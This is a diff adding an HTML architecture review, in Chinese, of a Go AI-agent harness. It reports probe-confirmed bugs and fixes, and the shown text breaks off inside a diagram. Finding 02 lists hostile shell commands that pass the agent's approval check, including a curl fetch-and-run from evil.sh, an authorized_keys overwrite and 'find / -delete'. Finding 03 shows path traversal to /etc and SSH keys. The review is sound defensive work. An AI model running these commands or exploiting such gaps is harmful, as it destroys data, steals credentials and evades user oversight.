@@ -1,0 +1,1138 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>simple-harness 架构审查</title>
+
+<style>
+  :root {
+    --ground: #F2F4F6;
+    --surface: #FFFFFF;
+    --ink: #131A20;
+    --ink-2: #4A5763;
+    --ink-3: #6E7B88;
+    --rule: #D6DCE2;
+    --rule-soft: #E7EBEF;
+    --accent: #0A6A6E;
+    --accent-soft: #E0EEEE;
+    --crit: #A81F26;
+    --crit-soft: #F7E6E7;
+    --warn: #8A5A00;
+    --warn-soft: #F8EEDC;
+    --ok: #256D45;
+    --ok-soft: #E2F0E8;
+
+    --mono: ui-monospace, "SF Mono", SFMono-Regular, Menlo, Consolas, "Liberation Mono", monospace;
+    --sans: system-ui, -apple-system, "Segoe UI", "Helvetica Neue", Arial, "PingFang SC", "Microsoft YaHei", sans-serif;
+  }
+
+  @media (prefers-color-scheme: dark) {
+    :root:not([data-theme="light"]) {
+      --ground: #0D1115;
+      --surface: #151B21;
+      --ink: #E4E9EE;
+      --ink-2: #8794A1;
+      --ink-3: #6B7783;
+      --rule: #26303A;
+      --rule-soft: #1D262E;
+      --accent: #43BDB8;
+      --accent-soft: #10312F;
+      --crit: #E4636A;
+      --crit-soft: #2C1618;
+      --warn: #D79A3C;
+      --warn-soft: #2A2113;
+      --ok: #55B67F;
+      --ok-soft: #14291D;
+    }
+  }
+
+  :root[data-theme="dark"] {
+    --ground: #0D1115;
+    --surface: #151B21;
+    --ink: #E4E9EE;
+    --ink-2: #8794A1;
+    --ink-3: #6B7783;
+    --rule: #26303A;
+    --rule-soft: #1D262E;
+    --accent: #43BDB8;
+    --accent-soft: #10312F;
+    --crit: #E4636A;
+    --crit-soft: #2C1618;
+    --warn: #D79A3C;
+    --warn-soft: #2A2113;
+    --ok: #55B67F;
+    --ok-soft: #14291D;
+  }
+
+  * { box-sizing: border-box; }
+
+  body {
+    background: var(--ground);
+    color: var(--ink);
+    font-family: var(--sans);
+    font-size: 16px;
+    line-height: 1.65;
+    margin: 0;
+    padding: 0 24px 96px;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  .wrap { max-width: 940px; margin: 0 auto; }
+  .prose { max-width: 68ch; }
+
+  /* ── masthead ─────────────────────────────── */
+  header.mast {
+    border-bottom: 2px solid var(--ink);
+    padding: 56px 0 20px;
+    margin-bottom: 40px;
+  }
+  .eyebrow {
+    font-family: var(--mono);
+    font-size: 11.5px;
+    letter-spacing: 0.14em;
+    text-transform: uppercase;
+    color: var(--accent);
+    margin: 0 0 18px;
+  }
+  h1 {
+    font-family: var(--mono);
+    font-size: clamp(30px, 5.2vw, 46px);
+    font-weight: 600;
+    letter-spacing: -0.025em;
+    line-height: 1.08;
+    margin: 0 0 16px;
+    text-wrap: balance;
+  }
+  .standfirst {
+    font-size: 17.5px;
+    color: var(--ink-2);
+    max-width: 62ch;
+    margin: 0;
+  }
+
+  .facts {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 8px 32px;
+    margin-top: 28px;
+    font-family: var(--mono);
+    font-size: 12.5px;
+    color: var(--ink-3);
+  }
+  .facts b { color: var(--ink); font-weight: 600; font-variant-numeric: tabular-nums; }
+
+  /* ── sections ─────────────────────────────── */
+  section { margin-bottom: 56px; }
+  h2 {
+    font-family: var(--mono);
+    font-size: 13px;
+    font-weight: 600;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    color: var(--ink);
+    margin: 0 0 6px;
+    padding-bottom: 10px;
+    border-bottom: 1px solid var(--rule);
+    display: flex;
+    justify-content: space-between;
+    align-items: baseline;
+    gap: 16px;
+  }
+  h2 .count {
+    font-weight: 400;
+    letter-spacing: 0.04em;
+    color: var(--ink-3);
+    text-transform: none;
+    font-variant-numeric: tabular-nums;
+  }
+  .lede { color: var(--ink-2); margin: 18px 0 28px; }
+
+  h3 {
+    font-family: var(--sans);
+    font-size: 17px;
+    font-weight: 650;
+    letter-spacing: -0.01em;
+    margin: 0 0 8px;
+    text-wrap: balance;
+  }
+  p { margin: 0 0 14px; }
+  p:last-child { margin-bottom: 0; }
+
+  code {
+    font-family: var(--mono);
+    font-size: 0.875em;
+    background: var(--rule-soft);
+    padding: 0.12em 0.36em;
+    border-radius: 2px;
+    word-break: break-word;
+  }
+
+  /* ── finding ledger ───────────────────────── */
+  .finding {
+    display: grid;
+    grid-template-columns: 40px 1fr;
+    gap: 0 20px;
+    padding: 26px 0;
+    border-bottom: 1px solid var(--rule-soft);
+  }
+  .finding:first-of-type { border-top: 1px solid var(--rule-soft); }
+  .idx {
+    font-family: var(--mono);
+    font-size: 13px;
+    font-variant-numeric: tabular-nums;
+    color: var(--ink-3);
+    padding-top: 3px;
+  }
+  .fbody { min-width: 0; }
+
+  .tags { display: flex; flex-wrap: wrap; gap: 6px; margin: 0 0 10px; }
+  .tag {
+    font-family: var(--mono);
+    font-size: 10.5px;
+    letter-spacing: 0.07em;
+    text-transform: uppercase;
+    padding: 2.5px 7px;
+    border-radius: 2px;
+    white-space: nowrap;
+  }
+  .t-crit { background: var(--crit-soft); color: var(--crit); }
+  .t-warn { background: var(--warn-soft); color: var(--warn); }
+  .t-arch { background: var(--accent-soft); color: var(--accent); }
+  .t-file { background: transparent; color: var(--ink-3); padding-left: 0; text-transform: none; letter-spacing: 0; }
+
+  .evidence {
+    margin: 14px 0 0;
+    padding: 12px 14px;
+    background: var(--surface);
+    border: 1px solid var(--rule);
+    border-radius: 2px;
+    font-family: var(--mono);
+    font-size: 12.5px;
+    line-height: 1.6;
+    color: var(--ink-2);
+    overflow-x: auto;
+    white-space: pre;
+  }
+  .evidence .lbl {
+    display: block;
+    font-size: 10.5px;
+    letter-spacing: 0.09em;
+    text-transform: uppercase;
+    color: var(--ink-3);
+    margin-bottom: 7px;
+  }
+  .evidence em { color: var(--crit); font-style: normal; }
+  .evidence strong { color: var(--ok); font-weight: 600; }
+
+  /* ── diagram ──────────────────────────────── */
+  figure { margin: 0 0 24px; }
+  .diagram {
+    background: var(--surface);
+    border: 1px solid var(--rule);
+    border-radius: 2px;
+    padding: 20px;
+    overflow-x: auto;
+  }
+  .diagram svg { display: block; min-width: 520px; width: 100%; height: auto; }
+  figcaption {
+    font-size: 13.5px;
+    color: var(--ink-3);
+    margin-top: 10px;
+    max-width: 64ch;
+  }
+
+  /* ── table ────────────────────────────────── */
+  .tbl-wrap { overflow-x: auto; }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 14.5px;
+    min-width: 520px;
+  }
+  th {
+    font-family: var(--mono);
+    font-size: 11px;
+    font-weight: 600;
+    letter-spacing: 0.09em;
+    text-transform: uppercase;
+    color: var(--ink-3);
+    text-align: left;
+    padding: 0 14px 9px 0;
+    border-bottom: 1px solid var(--rule);
+  }
+  td {
+    padding: 12px 14px 12px 0;
+    border-bottom: 1px solid var(--rule-soft);
+    vertical-align: top;
+  }
+  td:last-child, th:last-child { padding-right: 0; }
+  .num { font-family: var(--mono); font-variant-numeric: tabular-nums; color: var(--ink-3); white-space: nowrap; }
+
+  /* ── positives ────────────────────────────── */
+  .good { display: grid; gap: 18px; }
+  .good div {
+    padding-left: 16px;
+    border-left: 2px solid var(--ok);
+  }
+  .good h3 { font-size: 15.5px; margin-bottom: 4px; }
+  .good p { font-size: 14.5px; color: var(--ink-2); }
+
+  footer {
+    border-top: 1px solid var(--rule);
+    padding-top: 20px;
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--ink-3);
+    line-height: 1.7;
+  }
+
+  a { color: var(--accent); text-decoration-thickness: 1px; text-underline-offset: 2px; }
+  a:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; border-radius: 2px; }
+
+  @media (max-width: 620px) {
+    body { padding: 0 18px 72px; }
+    .finding { grid-template-columns: 1fr; gap: 0; }
+    .idx { padding-top: 0; margin-bottom: 8px; }
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <header class="mast">
+    <p class="eyebrow">架构审查 · 2026-08-10</p>
+    <h1>simple-harness</h1>
+    <p class="standfirst">
+      分层清晰、ADR 纪律扎实的Go agent harness。核心问题不在结构，而在<strong>边界执行力</strong>——
+      十个缺陷已用可执行探针证实：<code>go test ./...</code> 当前完全不可用，
+      <code>apply_patch</code> 会静默改错文件位置，一次超大工具输出会让会话永久无法打开。
+    </p>
+    <div class="facts">
+      <span><b>13,147</b> 行 Go</span>
+      <span><b>12</b> 个内部包</span>
+      <span><b>7,417</b> 行非测试代码</span>
+      <span>注释密度 <b>12.2%</b></span>
+      <span>build / vet / race <b>全绿</b></span>
+    </div>
+  </header>
+
+  <section>
+    <h2>总体判断</h2>
+    <div class="prose">
+      <p>
+        这个项目的架构骨架是<strong>好的</strong>：ADR 驱动的决策留痕、无状态 agent + per-call
+        <code>RuntimeContext</code> 的设计、middleware 洋葱链的注释质量，都超出同规模项目的常见水平。
+        <code>config</code> 包95.3% 覆盖率、<code>go vet</code> 与 <code>-race</code> 全绿，说明基础工程习惯到位。
+      </p>
+      <p>
+        问题集中在一个模式上：<strong>设计意图写在注释里，但没有被代码或类型强制</strong>。
+        shell 白名单意在放行只读命令，实际用前缀匹配一放到底；
+        transcript 写侧刻意"尽力而为"、读侧却要求逐行完美，两个各自合理的决定合起来能永久锁死会话。
+        文档说得越清楚、代码越没兜住，未来维护者越容易误信注释。
+      </p>
+      <p>
+        <strong>分层结构本身可以放心继续扩展</strong>：底层三包零内部依赖，
+        依赖方向基本符合自述顺序（两处倒置只是取一个类型，挪动即可）；
+        无状态 agent + per-call<code>RuntimeContext</code> 让"共享 chain 并发安全"成为结构性保证而非约定。
+        唯一需要在下一阶段一并考虑的设计问题是<strong>审批授权粒度</strong>（见"设计层面"一节）——
+        它与规划中的 workspace 耦合，补实现补不出来。
+      </p>
+      <p>
+        以下 10 项已通过可执行探针验证（非静态推测），探针已全部清理，工作区保持干净。
+        上下文管理与 workspace 边界为作者已规划、下一阶段实施的内容，<strong>不计为设计错误</strong>。
+      </p>
+    </div>
+  </section>
+
+  <section>
+    <h2>已验证缺陷 <span class="count">按影响排序</span></h2>
+
+    <div class="finding">
+      <div class="idx">01</div>
+      <div class="fbody">
+        <div class="tags">
+          <span class="tag t-crit">阻断</span>
+          <span class="tag t-crit">测试基建</span>
+          <span class="tag t-file">internal/e2e/e2e_test.go</span>
+        </div>
+        <h3>全部 5 个 TUI e2e 测试确定性挂死，<code>go test ./...</code> 不可用</h3>
+        <p>
+          <code>termtest.SendLine</code> 在 macOS/Linux 追加 <code>\n</code>（LF），而 bubbletea 把
+          LF 映射为 <code>ctrl+j</code>，<code>enter</code> 对应的是 <code>\r</code>（CR）。
+          结果输入被打进输入框却永不提交——终端快照里能看到"你好"静静躺在 MESSAGE 框内。
+          进程随后卡死到 PTY 读超时，最终整个测试二进制被强杀（exit 137）。
+        </p>
+        <p>
+          这不是 flaky，而是确定性失败，且影响的是<strong>整类</strong>测试：
+          <code>TestTUIInteractiveE2E</code>、<code>TestTUIApprovalE2E</code>、<code>TestTUIResumeE2E</code>、
+          <code>TestTUIExitsE2E</code> 全部用 <code>SendLine</code>。CLAUDE.md 推荐的 <code>go test ./...</code>
+          因此在当前环境必挂。
+        </p>
+        <div class="evidence"><span class="lbl">对照实验 ·同一测试仅改行尾</span>--- PASS: TestProbeCRvsLF/<strong>CR_回车</strong>          (0.28s)
+--- FAIL: TestProbeCRvsLF/<em>LF_换行（SendLine 现状）</em>  (8.58s)  ← 超时</div>
+        <p style="margin-top:14px">
+          修法：把 e2e 里的 <code>cp.SendLine(x)</code> 换成 <code>cp.SendUnterminated(x + "\r")</code>，
+          建议包一层 <code>sendKeys()</code> 辅助，避免以后再踩。
+        </p>
+      </div>
+    </div>
+
+    <div class="finding">
+      <div class="idx">02</div>
+      <div class="fbody">
+        <div class="tags">
+          <span class="tag t-crit">安全</span>
+          <span class="tag t-file">internal/middleware/impl/policy.go:77-130</span>
+        </div>
+        <h3>shell 白名单前缀匹配可绕过，破坏性命令免审批放行</h3>
+        <p>
+          <code>isSafe()</code> 用 <code>strings.HasPrefix</code> 匹配 <code>safeCommandPrefixes</code>，
+          只看命令开头，不理解 shell 语法。任何以白名单词开头的命令行——无论后面接了什么——都被判为"只读安全"直接放行。
+          7 个测试命令里 6 个在 <code>acceptedit</code> 模式下无需审批即可执行。
+        </p>
+        <div class="evidence"><span class="lbl">Decide(cmd, ModeAcceptEdits, nil) 实测</span>find / -delete                                  → <em>★放行（无审批）</em>
+cat /etc/passwd                                 → <em>★放行（无审批）</em>
+echo pwned &gt; ~/.ssh/authorized_keys→ <em>★放行（无审批）</em>
+ls &amp;&amp; curl http://evil.sh -o /tmp/x &amp;&amp; sh /tmp/x → <em>★放行（无审批）</em>
+env; python3 -c 'shutil.rmtree(...)'            → <em>★放行（无审批）</em>
+grep x /dev/null; rm -rf /tmp/victim            → 询问   ← 仅此一条被黑名单拦住</div>
+        <p style="margin-top:14px">
+          注意最后一条之所以被拦，是因为 <code>rm -rf</code> 命中了<em>黑名单子串</em>，而非白名单判对了。
+          换成 <code>find / -delete</code> 这种不含黑名单词的破坏性命令，就直接穿过去了。
+        </p>
+        <p>
+          修法：白名单判定前先拒绝含shell 元字符的命令行（<code>; | &amp; &gt; &lt; $( ` &amp;&amp; ||</code>），
+          只对"单一简单命令"应用前缀白名单。这比引入 tree-sitter 便宜得多，且能堵住上面全部案例。
+        </p>
+      </div>
+    </div>
+
+    <div class="finding">
+      <div class="idx">03</div>
+      <div class="fbody">
+        <div class="tags">
+          <span class="tag t-crit">安全</span>
+          <span class="tag t-arch">边界缺失</span>
+          <span class="tag t-file">internal/tools/fs.go · write_file.go · apply_patch.go</span>
+        </div>
+        <h3>全部 5 个文件工具无 workspace 边界，<code>readonly</code> 模式形同虚设</h3>
+        <p>
+          <code>read_file</code> / <code>list_dir</code> / <code>glob</code> / <code>write_file</code> /
+          <code>apply_patch</code> 都把模型给的路径直接交给 <code>os</code> 调用，
+          没有路径规范化、没有 workspace 前缀校验、没有 <code>../</code>穿越检查。
+          <code>grep -rn "state.CWD\|filepath.Abs\|filepath.IsAbs" internal/tools/</code> 在全部工具里<strong>零命中</strong>。
+        </p>
+        <div class="evidence"><span class="lbl">实测 · 直接调用各工具的 Handle（rc 传 nil）</span>read_file  /etc/hosts             → <em>★成功，读到 4113 字节</em>
+list_dir   /etc                   → <em>★成功，列出 76 项</em>
+glob       /etc/*.conf            → <em>★成功，/etc/asl.conf /etc/autofs.conf …</em>
+read_file  ../../../../../etc/hosts → <em>★成功，路径穿越未被拦</em>
+write_file /tmp/…                 → <em>★成功</em>
+
+<em>rc 传 nil 也全部正常工作 —— 工具根本不消费 rc.State.CWD</em></div>
+        <p style="margin-top:14px">
+          与审批策略叠加后后果被放大：<code>classify()</code> 把 read类工具归为 <code>classRead</code>，
+          <code>Decide</code> 在<em>任何</em>模式下都对它返回 <code>OutcomeAllow</code>（policy.go:193-195）。
+          也就是说最严格的 <code>readonly</code> 模式下，模型仍可无审批读取
+          <code>/etc/passwd</code>、<code>~/.ssh/id_rsa</code>、任意绝对路径。
+          "只读"限制的是写，不是读的范围——但用户会理解成后者。
+        </p>
+        <p>
+          修法：加一个 <code>resolveInWorkspace(rc, path)</code> 公共辅助（<code>filepath.Abs</code> +
+          <code>state.CWD</code> 为基 + 前缀校验），所有文件工具走它。这同时让
+          <code>state.CWD</code> 这个死字段变活。
+        </p>
+      </div>
+    </div>
+
+    <div class="finding">
+      <div class="idx">04</div>
+      <div class="fbody">
+        <div class="tags">
+          <span class="tag t-warn">正确性</span>
+          <span class="tag t-file">cmd/harness/run.go:53-62</span>
+        </div>
+        <h3><code>run --model</code> 装配错参数，thinking 配置静默泄漏</h3>
+        <p>
+          第 53 行 <code>ResolveFlags</code> 算出目标模型的完整配置 <code>res</code>，
+          第 57 行却把<em>默认</em>配置 <code>rt.Provider</code> 传给 <code>agent.Build</code>，
+          第 62 行又改回用 <code>res.Model</code>。于是 client 携带默认模型的 thinking 设置，
+          请求却发往另一个模型；而新会话 state 的 <code>ThinkingEnabled</code>/<code>ThinkingEffort</code>
+          都是零值，rc 覆盖为空，client 默认值一路生效。
+        </p>
+        <div class="evidence"><span class="lbl">配置：aaa-deep（默认，thinking 全档） / zzz-fast（enabled:false, efforts:[low]）</span>目标模型 zzz-fast 声明:  thinkingEnabled=false  efforts=[low]
+实际发出的请求:        model=zzz-fast<em>thinkingEnabled=true  effort="high"</em>
+
+<em>→ enabled=false 被忽略；effort=high 根本不在该模型支持集内</em></div>
+        <p style="margin-top:14px">
+          一行修复：<code>agent.Build(res, ...)</code>。<code>repl.go:32</code> 与
+          <code>resume.go:75</code> 传 <code>rt.Provider</code> 是对的（它们没有 <code>--model</code> 覆盖）。
+        </p>
+      </div>
+    </div>
+
+    <div class="finding">
+      <div class="idx">05</div>
+      <div class="fbody">
+        <div class="tags">
+          <span class="tag t-warn">正确性</span>
+          <span class="tag t-warn">UI 契约</span>
+          <span class="tag t-file">internal/config/resolve.go:25-35</span>
+        </div>
+        <h3><code>/model</code> 弹窗列出了无法选中的模型</h3>
+        <p>
+          <code>Controller.Models()</code>（command.go:78-91）遍历<strong>所有</strong> provider 收集模型名给弹窗，
+          但 <code>config.Resolve</code> 只在 <code>default_provider</code> 内查找模型（先定provider，再在其
+          <code>Models</code> 里找）。选中非默认 provider 的模型 → <code>SetModel</code> 调<code>Resolve</code> 报 not found。
+        </p>
+        <div class="evidence"><span class="lbl">两provider 各持一模型，请求 beta 的 model-b</span>Resolve(cfg, "model-b") → <em>error: provider "alpha": models: "model-b" not found</em>
+                <em>model-b 确实在配置里（beta 下），但查不到</em>
+
+同名模型撞车时：alpha.shared 与 beta.shared 共存 → 静默取alpha，无提示</div>
+        <p style="margin-top:14px">
+          UI 承诺了配置层不支持的能力。两个方向选一个：让 <code>Resolve</code> 支持跨 provider 查找
+          （模型名全局唯一，或用 <code>provider/model</code> 限定名），或让 <code>Models()</code>
+          只列当前 provider 的模型。前者是用户真正想要的，后者是诚实的最小修。
+        </p>
+      </div>
+    </div>
+
+    <div class="finding">
+      <div class="idx">06</div>
+      <div class="fbody">
+        <div class="tags">
+          <span class="tag t-warn">健壮性</span>
+          <span class="tag t-file">internal/session/transcript.go:89 · internal/tools/shell.go:65</span>
+        </div>
+        <h3>两处生命周期缺口：写后关panic、超时不杀进程组</h3>
+        <p>
+          <strong>（a）</strong> <code>TranscriptWriter.Write</code> 直接 <code>w.ch &lt;- line</code>，
+          <code>Close</code> 里 <code>close(w.ch)</code>。<code>Close</code> 之后任何一次
+          <code>AddUser</code>/<code>AddCommand</code>/<code>OnAgentEvent</code> 都会
+          panic 崩掉整个进程——而 <code>Close</code> 幂等（<code>closeOnce</code>）恰恰暗示了
+          "可能被多路径调用"的设计预期。<code>Flush</code> 同样中招。
+        </p>
+        <div class="evidence"><span class="lbl">实测</span>Write-after-Close → <em>panic: send on closed channel</em>
+Flush-after-Close → <em>panic: send on closed channel</em></div>
+        <p style="margin-top:14px">
+          <strong>（b）</strong> shell 工具用 <code>exec.CommandContext</code>，超时只杀
+          <code>sh</code> 本身，不杀进程组。命令若派生后台进程（<code>nohup ... &amp;</code>、
+          <code>npm run dev &amp;</code>），孤儿进程会残留。
+        </p>
+        <div class="evidence"><span class="lbl">实测：600ms 超时 + nohup sleep 41</span>err=signal: killed  ctxErr=context deadline exceeded
+<em>*** 孤儿进程残留：26527?? 0:00.00 sleep 41 ***</em></div>
+        <p style="margin-top:14px">
+          修法（a）：给 writer 加 <code>closed</code> 标志 + <code>RWMutex</code>，关闭后
+          <code>Write</code> 静默丢弃而非 panic。
+          修法（b）：<code>SysProcAttr{Setpgid: true}</code> +超时时 <code>syscall.Kill(-pgid, SIGKILL)</code>。
+        </p>
+      </div>
+    </div>
+
+    <div class="finding">
+      <div class="idx">07</div>
+      <div class="fbody">
+        <div class="tags">
+          <span class="tag t-crit">数据损坏</span>
+          <span class="tag t-file">internal/tools/apply_patch.go:206-272</span>
+        </div>
+        <h3><code>apply_patch</code> 会静默改错位置，且失败后不回滚</h3>
+        <p>
+          <strong>（a）首次匹配即改，无歧义检测。</strong>
+          <code>findSubsequence</code>（apply_patch.go:258）线性扫描取<em>第一个</em>匹配的位置，
+          不检查文件里是否存在多处同样的片段。而 <code>@@</code> 定位行——模型用来消除歧义的唯一手段——
+          在 <code>parseHunks:206-209</code> 被直接 <code>continue</code> 丢弃
+          （代码注释 apply_patch.go:22 也承认"v1 忽略内容仅作分隔"）。
+        </p>
+        <p>
+          后果是：文件里有重复片段时（同构的错误处理、相似的 getter、重复的 <code>return err</code>），
+          模型想改后面那处，实际改了前面那处，<strong>且返回 success</strong>。
+          模型和用户都不会收到任何警告。
+        </p>
+        <div class="evidence"><span class="lbl">实测· 文件含两个同构函数，补丁意图改 second()</span> 1: func first() error {
+ 2:     err := doA()
+ 3:     <em>return fmt.Errorf("second: %w", err)</em>   ← 改到了 first() 里
+ 4: }
+ 5:
+ 6: func second() error {
+ 7:     err := doB()
+ 8:     return err                              ← 模型真正想改的这行没动
+ 9: }
+
+<em>applyPatch 返回 err=&lt;nil&gt;，工具结果 Success=true</em></div>
+        <p style="margin-top:14px">
+          <strong>（b）多操作补丁无事务性。</strong>
+          <code>applyPatch:78-96</code> 顺序执行 ops，任一失败即 <code>return</code>，
+          <strong>不回滚已完成的操作</strong>。模型收到"失败"，磁盘却已被部分修改；
+          且因为 <code>applyAdd</code> 对已存在文件报错（apply_patch.go:156-158），
+          模型原样重试会撞上"文件已存在"，陷入无法自行恢复的状态。
+        </p>
+        <div class="evidence"><span class="lbl">实测 · 补丁含 Add File + Update File（后者路径不存在）</span>applyPatch 返回 err=Update File .../does-not-exist.txt: no such file
+<em>但 new.txt 已被创建（内容="created\n"）—— 无回滚</em></div>
+        <p style="margin-top:14px">
+          修法（a）：<code>findSubsequence</code> 改为找<em>全部</em>匹配，
+          多于一处时返回"歧义"错误并把候选行号回填给模型；同时把 <code>@@</code>
+          的定位文本用作匹配起点的过滤。这比引入完整 diff 库便宜，且直接消除静默错改。
+          修法（b）：先把全部 ops 解析并校验（文件存在性、hunk 可匹配性）再统一落盘，
+          或对涉及的文件先备份内容、失败时恢复。
+        </p>
+      </div>
+    </div>
+
+    <div class="finding">
+      <div class="idx">08</div>
+      <div class="fbody">
+        <div class="tags">
+          <span class="tag t-crit">数据丢失</span>
+          <span class="tag t-file">internal/session/load.go:38,61,65-67</span>
+        </div>
+        <h3>一次超大工具输出或一行写坏，会话永久无法 resume</h3>
+        <p>
+          <code>loadHistoryFile</code> 用<code>bufio.Scanner</code> 且缓冲上限 4MB
+          （load.go:38 与 61各一处），单行超限直接 <code>ErrTooLong</code>；
+          JSON 解析失败则 <code>return nil, fmt.Errorf("bad line")</code>（load.go:65-67）——
+          <strong>不跳过、不降级、不保留前面已读到的完好行</strong>。
+        </p>
+        <p>
+          这条路径在实践中可达，因为 transcript 存的是<strong>未截断</strong>的工具结果：
+          <code>emit(EventToolResult)</code> 在 <code>tool.Handle</code> 返回后立刻发出（agent.go:281），
+          而 <code>ToolOutputMiddleware</code> 的 20KB 截断发生在 <code>next()</code> 返回<em>之后</em>
+          改写 <code>rc.Messages</code>（tool_output.go:83-94）。
+          也就是说 conversation 被截断到 20KB，transcript 却忠实记下全量。
+          一条 <code>shell_command</code> 吐出 4MB 以上输出（<code>cat</code> 一个大文件、
+          一次啰嗦的构建日志），该会话此后永久打不开。
+        </p>
+        <div class="evidence"><span class="lbl">实测 · 构造 transcript</span>含 5MB 合法 JSON 行 + 后续正常 user 行:
+  LoadConversation → <em>err = bufio.Scanner: token too long</em>
+  LoadLines        → <em>0 行</em>（后面那条完好的 user 行也读不到）
+
+含一行崩溃截断的半个 JSON:
+  LoadConversation → <em>err = bad line: unexpected end of JSON input</em>
+  <em>前面完好的行被一并丢弃</em></div>
+        <p style="margin-top:14px">
+          更糟的是 TUI 会<strong>掩盖</strong>这个故障：<code>loadSessionHistory</code>
+          在 <code>TranscriptLines()</code> 报错时静默回退到 conversation 渲染（tui/run.go:42-48），
+          用户看到一个"正常打开但内容不全"的会话，而不是一条错误信息。
+        </p>
+        <p>
+          根因是<strong>写读不对称</strong>：写侧几乎所有落盘错误都被静默丢弃
+          （transcript.go:163-168 的 <code>json.Marshal</code> 与 <code>file.Write</code>、
+          149-152 的切段失败），读侧却要求"逐行完美 JSON 且每行 &lt; 4MB"。
+          修法：读侧改为跳过坏行并计数上报（<code>bufio.Reader</code> 替代 Scanner 以免行长限制），
+          写侧对超大content 先落 <code>evictions/</code> 再在 transcript 里记指针。
+        </p>
+      </div>
+    </div>
+
+    <div class="finding">
+      <div class="idx">09</div>
+      <div class="fbody">
+        <div class="tags">
+          <span class="tag t-warn">竞态</span>
+          <span class="tag t-file">internal/ui/tui/run.go:32 · internal/session/transcript.go:90</span>
+        </div>
+        <h3>回合进行中收到 SIGTERM，writer 写后关 panic 变为可达</h3>
+        <p>
+          第 06 项证实了 <code>Write</code>/<code>Flush</code> 在 <code>Close</code> 后会 panic。
+          单看主路径它不可达（<code>runCmd</code> 的 <code>defer sess.Close()</code> 排在
+          <code>&lt;-runDone</code> 之后；<code>/exit</code> 只在 <code>!m.running</code> 时生效）。
+          但 TUI 有一条真实竞态路径：
+        </p>
+        <div class="evidence"><span class="lbl">路径</span>resumeCmd: signal.NotifyContext(ctx, SIGTERM)     (resume.go:82)
+       ↓ program用 tea.WithContext(ctx)          (tui/run.go:29)
+SIGTERM 到达 → program.Run() 因 ctx 取消而返回
+       ↓ defer controller.CloseAll() 关闭 writer  (tui/run.go:32)
+<em>但 agent run goroutine 从未被等待，仍在运行</em>
+       ↓ 它的 ctx 也被取消 → emit EventError      (agent.go:138/146)
+       ↓ controller.onEvent → active.OnAgentEvent (controller.go:84-89)
+       ↓ w.Write → <em>panic: send on closed channel</em></div>
+        <p style="margin-top:14px">
+          同一竞态还有第二种触发方式：channel 缓冲（256）满时生产者阻塞在 <code>w.ch &lt;-</code>，
+          此时 <code>close(w.ch)</code> 同样让阻塞中的发送者 panic。
+          <code>closeOnce</code> 只保证 <code>Close</code> 自身幂等，管不了 Close 与并发 Write 的关系。
+        </p>
+        <p>
+          修法：<code>RunTUI</code> 在<code>CloseAll</code> 前等待 run goroutine 退出，
+          外加 writer 侧的 <code>closed</code> 标志兜底（两者都要，前者治因后者治症）。
+        </p>
+      </div>
+    </div>
+
+    <div class="finding">
+      <div class="idx">10</div>
+      <div class="fbody">
+        <div class="tags">
+          <span class="tag t-warn">状态建模</span>
+          <span class="tag t-file">internal/ui/tui/popup.go:130 · model.go:532-544</span>
+        </div>
+        <h3>覆盖层无优先级建模，审批未决时队列命令可开出第二层弹窗</h3>
+        <p>
+          三个覆盖层字段 <code>appr</code>（审批）/ <code>sel</code>（选择弹窗）/ <code>help</code>
+          可同时为真。互斥性只由两处<em>顺序</em>隐式保证：渲染看 <code>modalArea</code> 的
+          switch（view.go 内appr &gt; sel &gt; help），按键看 <code>handleKey</code>
+          开头的 if 链（model.go:202-208）。<code>openPopup</code>（popup.go:130）
+          没有 <code>if m.appr != nil</code> 守卫。
+        </p>
+        <p>
+          按键通道其实是安全的——我实测 <code>appr != nil</code> 时 <code>handleApprovalKey</code>
+          拦下了包括 <code>enter</code> 在内的所有按键，用户无法在审批挂起时手动开弹窗。
+          真正的通道是<strong>队列消费</strong>：回合期间输入的 <code>/help</code> 进队列，
+          <code>handleRunDone</code> 在回合结束时直接调 <code>handleInput</code> 执行它，
+          完全不检查 <code>appr</code> 状态。
+        </p>
+        <div class="evidence"><span class="lbl">实测 · appr 挂起 + 队列含 /help，触发 runDoneMsg</span>handleRunDone 后: appr=<em>true</em>  sel=false  help=<em>true</em>   ← 两个overlay 并存
+View() 渲染:      审批框=true   帮助框=false        ← help 被 appr 遮住
+
+<em>用户答完审批(y/s/n) → appr 清空 → help 突然浮现</em>
+<em>一个他早已"发出"却从未见过的命令</em></div>
+        <p style="margin-top:14px">
+          后果是 UX 错乱而非崩溃，但根因值得修：把三个字段收成一个
+          <code>overlay</code> 单字段（带kind 的 tagged union），非法组合就不可表达，
+          渲染与按键分发也各自只剩一处判断。
+        </p>
+      </div>
+    </div>
+  </section>
+
+  <section>
+    <h2>依赖方向 <span class="count">2 处倒置</span></h2>
+    <p class="lede">
+      两处底层包引用上层包。均<strong>不构成编译期循环</strong>（我核对了两侧的import），
+      但方向是倒的，会阻碍后续拆分与复用。
+    </p>
+
+    <figure>
+      <div class="diagram">
+        <svg viewBox="0 0 620 320" role="img" aria-label="包分层图，标出两条向上的依赖边">
+          <defs>
+            <marker id="ar-bad" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+              <path d="M0,0 L10,5 L0,10 z" fill="var(--crit)"/>
+            </marker>
+          </defs>
+
+          <!-- L5 -->
+          <rect x="20" y="16" width="580" height="34" fill="var(--rule-soft)" stroke="var(--rule)"/>
+          <text x="32" y="38" font-family="var(--mono)" font-size="12.5" fill="var(--ink-2)">cmd/harness · app</text>
+          <text x="588" y="38" font-family="var(--mono)" font-size="10.5" fill="var(--ink-3)" text-anchor="end">装配</text>
+
+          <!-- L4 -->
+          <rect x="20" y="66" width="580" height="34" fill="var(--rule-soft)" stroke="var(--rule)"/>
+          <text x="32" y="88" font-family="var(--mono)" font-size="12.5" fill="var(--ink-2)">ui · ui/tui</text>
+          <text x="588" y="88" font-family="var(--mono)" font-size="10.5" fill="var(--ink-3)" text-anchor="end">交互</text>
+
+          <!-- L3 agent -->
+          <rect x="20" y="116" width="280" height="34" fill="var(--rule-soft)" stroke="var(--rule)"/>
